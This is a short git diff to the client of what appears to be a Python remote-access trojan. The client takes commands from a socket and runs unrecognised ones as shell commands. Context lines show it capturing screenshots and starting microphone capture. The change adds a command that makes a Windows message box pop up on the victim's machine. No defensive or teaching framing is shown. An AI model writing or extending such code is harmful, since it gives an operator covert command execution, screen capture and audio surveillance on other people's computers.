@@ -10,6 +10,7 @@ import struct
 from multiprocessing import Process
 import threading
 import pyautogui
+import ctypes
 
 
 PATH = os.path.dirname(os.path.realpath(__file__))
@@ -59,6 +60,13 @@ def sending_audio_data():
 
     os.system("python microphone-client.py")
 
+
+def show_popup(title, message):
+
+    ctypes.windll.user32.MessageBoxW(0, title, message, 0)
+
+
+
 while True:
     command = s.recv(52).decode("utf-8")
 
@@ -92,7 +100,12 @@ while True:
             data = file.read(609600)
             s.send(data)
         os.remove("snapshot.png")
-     
+
+    elif command.split(" ")[0] == "popup" and command[-1] == "'":
+        title = command.split("'")[1]
+        message = command.split("'")[3]
+        threading.Thread(target=show_popup, args=(title, message)).start()
+
 
     elif command != "":
         proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
